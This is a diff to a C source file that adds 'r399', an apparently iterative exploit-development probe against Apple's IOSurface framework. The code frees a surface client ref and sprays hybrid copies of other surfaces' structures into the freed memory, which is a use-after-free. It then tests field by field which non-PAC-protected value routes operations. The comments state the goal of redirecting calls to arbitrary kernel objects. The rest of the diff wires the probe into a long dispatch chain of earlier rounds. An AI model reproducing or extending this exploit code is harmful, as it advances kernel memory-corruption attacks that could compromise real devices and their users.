@@ -16141,6 +16141,254 @@ static void r393_probe(void) {
 }
 
 /*
+ * r399: Client ref field analysis.
+ *
+ * Key observation: SetValue/Lock/RemoveValue work through the redirect, but
+ * CopyValue/GetID crash. The working operations must use a DIFFERENT field
+ * in the 448-byte client ref to identify the kernel-side surface, one that
+ * is NOT PAC-protected. If we can identify this field and modify it, we can
+ * potentially redirect operations to ANY kernel object.
+ *
+ * Phase 1: Dump and compare two surfaces' client refs byte-by-byte
+ * Phase 2: Identify which 8-byte fields differ between surfaces
+ * Phase 3: Create a "hybrid" client ref where we selectively copy fields
+ *          from surface A vs B, then test which combination makes SetValue
+ *          route to A vs B
+ * Phase 4: Once the routing field is identified, test if we can set it to
+ *          arbitrary values (potential redirect to non-IOSurface kernel objects)
+ */
+static volatile int g_r399_crashed = 0;
+static sigjmp_buf g_r399_jmp;
+static void r399_sighandler(int sig) {
+    g_r399_crashed = sig;
+    siglongjmp(g_r399_jmp, 1);
+}
+
+static void r399_probe(void) {
+    rlog("\n=== r399: Client Ref Field Analysis ===\n\n");
+    fflush(stdout);
+
+    void (*clientRelease)(IOSurfaceRef) = dlsym(RTLD_DEFAULT, "IOSurfaceClientRelease");
+    if (!clientRelease) { rlog("  Missing symbols\n"); return; }
+
+    struct sigaction sa399, old_bus399, old_segv399;
+    memset(&sa399, 0, sizeof(sa399));
+    sa399.sa_handler = r399_sighandler;
+    sa399.sa_flags = 0;
+    sigaction(SIGBUS, &sa399, &old_bus399);
+    sigaction(SIGSEGV, &sa399, &old_segv399);
+
+    int w=64, h=64, bpe=4, bpr=64*4, pf_=0x42475241, as_=64*64*4;
+    CFMutableDictionaryRef props = CFDictionaryCreateMutable(NULL, 0,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    CFNumberRef nW = CFNumberCreate(NULL, kCFNumberIntType, &w);
+    CFNumberRef nH = CFNumberCreate(NULL, kCFNumberIntType, &h);
+    CFNumberRef nB = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+    CFNumberRef nR = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+    CFNumberRef nP = CFNumberCreate(NULL, kCFNumberIntType, &pf_);
+    CFNumberRef nA = CFNumberCreate(NULL, kCFNumberIntType, &as_);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), nW);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), nH);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerElement"), nB);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerRow"), nR);
+    CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), nP);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceAllocSize"), nA);
+
+    /* ---- Phase 1: Dump and compare client refs ---- */
+    rlog("  Phase 1: Client ref structure comparison\n");
+
+    IOSurfaceRef surfA = IOSurfaceCreate(props);
+    IOSurfaceRef surfB = IOSurfaceCreate(props);
+    IOSurfaceRef surfC = IOSurfaceCreate(props);
+    uint32_t sidA = IOSurfaceGetID(surfA);
+    uint32_t sidB = IOSurfaceGetID(surfB);
+    uint32_t sidC = IOSurfaceGetID(surfC);
+    rlog("    surfA: sid=%u ptr=%p\n", sidA, surfA);
+    rlog("    surfB: sid=%u ptr=%p\n", sidB, surfB);
+    rlog("    surfC: sid=%u ptr=%p\n", sidC, surfC);
+
+    uint8_t dataA[512], dataB[512], dataC[512];
+    memcpy(dataA, (void*)surfA, 512);
+    memcpy(dataB, (void*)surfB, 512);
+    memcpy(dataC, (void*)surfC, 512);
+
+    /* Compare A vs B at 8-byte granularity */
+    rlog("\n    8-byte field comparison (A vs B):\n");
+    int diff_offsets[64];
+    int ndiffs = 0;
+    for (int off = 0; off < 448; off += 8) {
+        uint64_t va = *(uint64_t*)(dataA + off);
+        uint64_t vb = *(uint64_t*)(dataB + off);
+        if (va != vb) {
+            rlog("    +%3d: A=0x%016llx B=0x%016llx", off,
+                (unsigned long long)va, (unsigned long long)vb);
+            /* Check if it looks like a pointer */
+            if ((va >> 40) != 0 && (va >> 40) != 0xFFFFFF) rlog(" [ptr-like]");
+            /* Check if it's a simple counter/ID */
+            int64_t delta = (int64_t)vb - (int64_t)va;
+            if (delta > 0 && delta < 100) rlog(" [delta=%lld]", (long long)delta);
+            rlog("\n");
+            if (ndiffs < 64) diff_offsets[ndiffs++] = off;
+        }
+    }
+    rlog("    Total differing fields: %d\n", ndiffs);
+
+    /* Also dump the full first 64 bytes of A for structure understanding */
+    rlog("\n    surfA full dump (first 112 bytes, 8B per line):\n");
+    for (int off = 0; off < 112; off += 8) {
+        uint64_t v = *(uint64_t*)(dataA + off);
+        rlog("    +%3d: 0x%016llx", off, (unsigned long long)v);
+        /* Annotate known fields */
+        if (off == 0) rlog("  <isa, PAC-signed>");
+        if (off == 8) rlog("  <shared ptr, PAC-signed>");
+        if (off >= 48 && off < 64) {
+            char ascii[9] = {0};
+            memcpy(ascii, dataA + off, 8);
+            int printable = 1;
+            for (int i = 0; i < 8 && ascii[i]; i++) {
+                if (ascii[i] < 0x20 || ascii[i] > 0x7e) { printable = 0; break; }
+            }
+            if (printable && ascii[0]) rlog("  <'%s'>", ascii);
+        }
+        rlog("\n");
+    }
+    fflush(stdout);
+
+    /* ---- Phase 2: Identify the routing field ---- */
+    rlog("\n  Phase 2: Field-by-field redirect test\n");
+
+    /* Strategy: free surfC, spray a HYBRID client ref where most fields
+       come from surfA but ONE field comes from surfB. Test which hybrid
+       makes SetValue route to A vs B. */
+    uintptr_t freedC = (uintptr_t)surfC;
+    clientRelease(surfC);
+    rlog("    Freed surfC at %p\n", (void*)freedC);
+
+    /* First verify: full A data → routes to A */
+    memcpy((void*)freedC, dataA, 448);
+    g_r399_crashed = 0;
+    if (sigsetjmp(g_r399_jmp, 1) == 0) {
+        int v = 0xAAAA;
+        CFNumberRef nv = CFNumberCreate(NULL, kCFNumberIntType, &v);
+        IOSurfaceSetValue(surfC, CFSTR("FieldTest"), nv);
+        CFRelease(nv);
+    }
+    CFTypeRef rvA = IOSurfaceCopyValue(surfA, CFSTR("FieldTest"));
+    CFTypeRef rvB = IOSurfaceCopyValue(surfB, CFSTR("FieldTest"));
+    rlog("    Full A spray: A has FieldTest? %s, B has? %s\n",
+        rvA ? "YES" : "no", rvB ? "YES" : "no");
+    if (rvA) { IOSurfaceRemoveValue(surfA, CFSTR("FieldTest")); CFRelease(rvA); }
+    if (rvB) { IOSurfaceRemoveValue(surfB, CFSTR("FieldTest")); CFRelease(rvB); }
+
+    /* Full B data → routes to B */
+    memcpy((void*)freedC, dataB, 448);
+    g_r399_crashed = 0;
+    if (sigsetjmp(g_r399_jmp, 1) == 0) {
+        int v = 0xBBBB;
+        CFNumberRef nv = CFNumberCreate(NULL, kCFNumberIntType, &v);
+        IOSurfaceSetValue(surfC, CFSTR("FieldTest"), nv);
+        CFRelease(nv);
+    }
+    rvA = IOSurfaceCopyValue(surfA, CFSTR("FieldTest"));
+    rvB = IOSurfaceCopyValue(surfB, CFSTR("FieldTest"));
+    rlog("    Full B spray: A has FieldTest? %s, B has? %s\n",
+        rvA ? "YES" : "no", rvB ? "YES" : "no");
+    if (rvA) { IOSurfaceRemoveValue(surfA, CFSTR("FieldTest")); CFRelease(rvA); }
+    if (rvB) { IOSurfaceRemoveValue(surfB, CFSTR("FieldTest")); CFRelease(rvB); }
+    fflush(stdout);
+
+    /* Now test each differing field individually:
+       Start with A's data, swap in B's value at one offset, test routing */
+    rlog("\n    Per-field routing test (A base, swap one field to B):\n");
+
+    for (int di = 0; di < ndiffs; di++) {
+        int off = diff_offsets[di];
+        uint8_t hybrid[512];
+        memcpy(hybrid, dataA, 512);
+        /* Swap in B's value at this offset */
+        memcpy(hybrid + off, dataB + off, 8);
+
+        memcpy((void*)freedC, hybrid, 448);
+
+        g_r399_crashed = 0;
+        char routeResult = '?';
+        if (sigsetjmp(g_r399_jmp, 1) == 0) {
+            int v = 0xCC00 + di;
+            CFNumberRef nv = CFNumberCreate(NULL, kCFNumberIntType, &v);
+            IOSurfaceSetValue(surfC, CFSTR("FieldTest2"), nv);
+            CFRelease(nv);
+
+            rvA = IOSurfaceCopyValue(surfA, CFSTR("FieldTest2"));
+            rvB = IOSurfaceCopyValue(surfB, CFSTR("FieldTest2"));
+            if (rvA && !rvB) routeResult = 'A';
+            else if (!rvA && rvB) routeResult = 'B';
+            else if (rvA && rvB) routeResult = '!'; /* both — unexpected */
+            else routeResult = '-'; /* neither — lost */
+            if (rvA) { IOSurfaceRemoveValue(surfA, CFSTR("FieldTest2")); CFRelease(rvA); }
+            if (rvB) { IOSurfaceRemoveValue(surfB, CFSTR("FieldTest2")); CFRelease(rvB); }
+        } else {
+            routeResult = 'X'; /* crash */
+        }
+        rlog("    +%3d: swap B → route=%c", off, routeResult);
+        if (routeResult == 'B') rlog("  *** THIS FIELD CONTROLS ROUTING ***");
+        if (routeResult == 'X') rlog("  (crashed sig=%d)", g_r399_crashed);
+        rlog("\n");
+    }
+    fflush(stdout);
+
+    /* ---- Phase 3: Reverse test — B base, swap fields to A ---- */
+    rlog("\n  Phase 3: Reverse test (B base, swap one field to A)\n");
+
+    for (int di = 0; di < ndiffs && di < 20; di++) {
+        int off = diff_offsets[di];
+        uint8_t hybrid[512];
+        memcpy(hybrid, dataB, 512);
+        memcpy(hybrid + off, dataA + off, 8);
+
+        memcpy((void*)freedC, hybrid, 448);
+
+        g_r399_crashed = 0;
+        char routeResult = '?';
+        if (sigsetjmp(g_r399_jmp, 1) == 0) {
+            int v = 0xDD00 + di;
+            CFNumberRef nv = CFNumberCreate(NULL, kCFNumberIntType, &v);
+            IOSurfaceSetValue(surfC, CFSTR("FieldTest3"), nv);
+            CFRelease(nv);
+
+            rvA = IOSurfaceCopyValue(surfA, CFSTR("FieldTest3"));
+            rvB = IOSurfaceCopyValue(surfB, CFSTR("FieldTest3"));
+            if (rvA && !rvB) routeResult = 'A';
+            else if (!rvA && rvB) routeResult = 'B';
+            else if (rvA && rvB) routeResult = '!';
+            else routeResult = '-';
+            if (rvA) { IOSurfaceRemoveValue(surfA, CFSTR("FieldTest3")); CFRelease(rvA); }
+            if (rvB) { IOSurfaceRemoveValue(surfB, CFSTR("FieldTest3")); CFRelease(rvB); }
+        } else {
+            routeResult = 'X';
+        }
+        rlog("    +%3d: swap A → route=%c", off, routeResult);
+        if (routeResult == 'A') rlog("  *** THIS FIELD CONTROLS ROUTING ***");
+        if (routeResult == 'X') rlog("  (crashed sig=%d)", g_r399_crashed);
+        rlog("\n");
+    }
+    fflush(stdout);
+
+    /* ---- Phase 4: Test setting the routing field to arbitrary values ---- */
+    rlog("\n  Phase 4: Routing field value range test\n");
+    rlog("    (Will be implemented once routing field identified)\n");
+
+    /* Cleanup */
+    sigaction(SIGBUS, &old_bus399, NULL);
+    sigaction(SIGSEGV, &old_segv399, NULL);
+    CFRelease(surfA);
+    CFRelease(surfB);
+    CFRelease(props);
+
+    rlog("\n=== r399 complete ===\n");
+    fflush(stdout);
+}
+
+/*
  * r398: Direct IOKit interface enumeration.
  *
  * The IOSurface framework wraps IOKit calls and filters outputs. By calling
@@ -63474,6 +63722,13 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 402) {
+            rlog("*** rounds=402: Client Ref Field Analysis ***\n");
+            rlog("  Structure comparison, field-by-field routing test, routing field ID.\n\n");
+            fflush(stdout);
+            r399_probe();
+            goto done;
+        }
         if (rounds == 401) {
             rlog("*** rounds=401: IOKit Interface Enumeration ***\n");
             rlog("  Direct selector calls, MapMemory types, mach_port_kobject, metadata.\n\n");
@@ -65873,7 +66128,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
